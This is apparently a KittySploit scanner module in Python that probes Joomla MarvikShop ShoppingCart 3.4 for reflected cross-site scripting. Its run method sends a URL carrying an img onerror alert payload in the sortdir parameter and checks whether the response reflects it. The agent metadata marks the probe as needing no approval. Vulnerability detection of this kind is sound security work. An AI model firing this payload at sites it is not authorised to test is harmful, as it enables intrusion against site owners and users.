#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Joomla MarvikShop ShoppingCart 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla MarvikShop ShoppingCart 3.4 - Cross-Site Scripting Detection',
        'description': "Joomla MarvikShop ShoppingCart 3.4 is vulnerable to reflected xss where attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'joomla', 'marvikshop', 'xss', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/168598/Joomla-MarvikShop-ShoppingCart-3.4-Cross-Site-Scripting.html',
            'https://cxsecurity.com/issue/WLB-2022100015',
            'https://extensions.joomla.org/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=descgt5po%3Cimg%20src=a%20onerror=alert(document.domain)%3Evh217', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<img src=a onerror=alert(document.domain)>', 'TEP STOP', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Joomla MarvikShop ShoppingCart 3.4 - Cross-Site Scripting detected",
                path='/?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=descgt5po%3Cimg%20src=a%20onerror=alert(document.domain)%3Evh217',
            )
            return True
        return False

